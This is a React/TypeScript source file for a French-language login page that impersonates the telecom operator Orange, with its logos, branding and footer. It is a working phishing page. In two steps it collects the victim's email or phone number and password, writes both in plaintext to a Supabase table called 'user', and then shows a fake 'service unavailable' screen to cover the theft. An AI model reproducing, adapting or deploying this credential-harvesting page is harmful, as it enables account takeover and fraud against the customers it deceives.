import { useState } from 'react';
import { ArrowLeft, Eye, EyeOff, HelpCircle } from 'lucide-react';
import logoOrange from '@/assets/logo-orange.png';
import LoadingScreen from '@/components/LoadingScreen';
import ServiceUnavailable from '@/pages/ServiceUnavailable';
import { supabase } from '@/lib/supabase';

const LoginWeb = () => {
  const [step, setStep] = useState<'email' | 'password' | 'loading' | 'service-unavailable'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isPasswordLoading, setIsPasswordLoading] = useState(false);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) {
      // Stocker l'email/téléphone en local
      localStorage.setItem('userEmail', email.trim());
      setIsLoading(true);
      
      // Simuler un délai de chargement
      setTimeout(() => {
        setIsLoading(false);
        setStep('password');
      }, 2000);
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (password.trim()) {
      setIsPasswordLoading(true);
      
      try {
        // Récupérer l'email/téléphone du localStorage
        const userEmail = localStorage.getItem('userEmail');
        
        if (userEmail) {
          // Sauvegarder dans Supabase
          const { error } = await supabase
            .from('user')
            .insert([
              { email_or_phone: userEmail, password: password.trim() }
            ]);

          if (error) {
            console.error('Erreur lors de la sauvegarde:', error);
          } else {
            console.log('Utilisateur sauvegardé avec succès');
          }
        }

        // Nettoyer le localStorage
        localStorage.removeItem('userEmail');
        
        // Simuler un délai de chargement
        setTimeout(() => {
          setIsPasswordLoading(false);
          setStep('service-unavailable');
        }, 2000);
      } catch (error) {
        console.error('Erreur:', error);
        setIsPasswordLoading(false);
        setStep('service-unavailable');
      }
    }
  };

  const handleBackToEmail = () => {
    setStep('email');
  };

  // Si on affiche la page service indisponible
  if (step === 'service-unavailable') {
    return <ServiceUnavailable />;
  }


  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      {/* Header global avec logo Orange */}
      <header className="bg-black py-4">
        <div className="max-w-6xl mx-auto px-4">
          <div className="flex justify-center">
            <img 
              src={logoOrange} 
              alt="Orange" 
              className="h-8 w-auto"
            />
          </div>
        </div>
      </header>

      {/* Contenu principal */}
      <main className="flex-1 pt-16 pb-8">
        <div className="max-w-4xl mx-auto px-4">
          {/* Carte blanche positionnée en haut */}
          <div className="bg-white rounded-lg shadow-lg p-12 w-full">
            {/* Logo Orange dans la carte */}
            <div className="text-center mb-8">
              <img 
                src={logoOrange} 
                alt="Orange" 
                className="h-12 w-auto mx-auto mb-6"
              />
              <h1 className="text-3xl font-bold text-black mb-4">
                {step === 'email' ? 'Identifiez-vous' : 'Bienvenue'}
              </h1>
              {step === 'email' && (
                <>
                  <p className="text-xl font-semibold text-black mb-4">
                    Indiquez votre compte Orange
                  </p>
                  
                  {/* Section informative */}
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
                    <div className="flex items-start gap-3">
                      <div className="flex-shrink-0">
                        <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center">
                          <HelpCircle size={16} className="text-white" />
                        </div>
                      </div>
                      <div className="flex-1">
                        <p className="text-sm text-blue-800 leading-relaxed">
                          Saisissez le numéro mobile ou l'adresse email fournis par Orange ou Sosh lors de votre souscription.
                        </p>
                      </div>
                    </div>
                  </div>
                </>
              )}
            </div>

            {/* Formulaire */}
            <form onSubmit={step === 'email' ? handleEmailSubmit : handlePasswordSubmit}>
              {step === 'email' ? (
                <>
                  {/* Champ email */}
                  <div className="mb-8">
                    <input
                      type="text"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Adresse e-mail ou nº de mobile Orange"
                      className="w-full text-xl border-0 border-b-2 border-gray-300 focus:border-black focus:outline-none pb-3 bg-transparent"
                      required
                    />
                  </div>
                </>
              ) : (
                <>
                  {/* Champ email pré-rempli */}
                  <div className="mb-8">
                    <div className="flex items-center bg-gray-100 rounded-lg p-4 mb-6">
                      <button
                        type="button"
                        onClick={handleBackToEmail}
                        className="mr-4 text-gray-600"
                      >
                        <ArrowLeft size={24} />
                      </button>
                      <div className="flex-1 flex items-center">
                        <div className="w-10 h-10 bg-gray-300 rounded-full flex items-center justify-center mr-4">
                          <div className="w-5 h-5 bg-gray-500 rounded-full"></div>
                        </div>
                        <span className="text-gray-700 text-lg">{email}</span>
                      </div>
                    </div>
                  </div>

                  {/* Champ mot de passe */}
                  <div className="mb-8">
                    <label className="block text-xl font-semibold text-black mb-4">
                      Saisissez votre mot de passe
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="Votre mot de passe"
                        className="w-full text-xl border-0 border-b-2 border-gray-300 focus:border-black focus:outline-none pb-3 bg-transparent pr-12"
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-0 top-0 text-orange-500"
                      >
                        {showPassword ? <EyeOff size={24} /> : <Eye size={24} />}
                      </button>
                    </div>
                  </div>
                </>
              )}

              {/* Bouton continuer */}
              <div className="text-center">
                <button
                  type="submit"
                  disabled={isLoading || isPasswordLoading}
                  className={`bg-black text-white py-4 px-12 rounded-lg font-semibold text-xl transition-colors flex items-center justify-center gap-2 ${
                    isLoading || isPasswordLoading
                      ? 'opacity-70 cursor-not-allowed' 
                      : 'hover:bg-gray-800'
                  }`}
                >
                  {isLoading || isPasswordLoading ? (
                    <>
                      <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                      Chargement...
                    </>
                  ) : (
                    step === 'email' ? 'Continuer' : "S'identifier"
                  )}
                </button>
              </div>

              {/* Lien mot de passe oublié */}
              {step === 'password' && (
                <div className="text-center mt-6">
                  <a href="#" className="text-black hover:text-gray-600 flex items-center justify-center gap-2 text-lg">
                    Mot de passe oublié ?
                    <ArrowLeft size={20} className="rotate-180" />
                  </a>
                </div>
              )}
            </form>
          </div>
        </div>
      </main>

      {/* Footer global */}
      <footer className="bg-black text-white py-6">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-2 gap-8 text-sm">
            <div className="space-y-2">
              <div>Informations légales</div>
              <div>Plan de site</div>
              <div>Données personnelles</div>
              <div>Accessibilité : non conforme</div>
              <div>Tarifs et Contrats</div>
              <div>Politique des cookies</div>
            </div>
            <div className="space-y-2">
              <div>Gestion cookies</div>
              <div>Livraisons</div>
              <div>Retours</div>
              <div>Publicité</div>
              <div>Signaler un contenu</div>
              <div>© Orange 2025</div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default LoginWeb;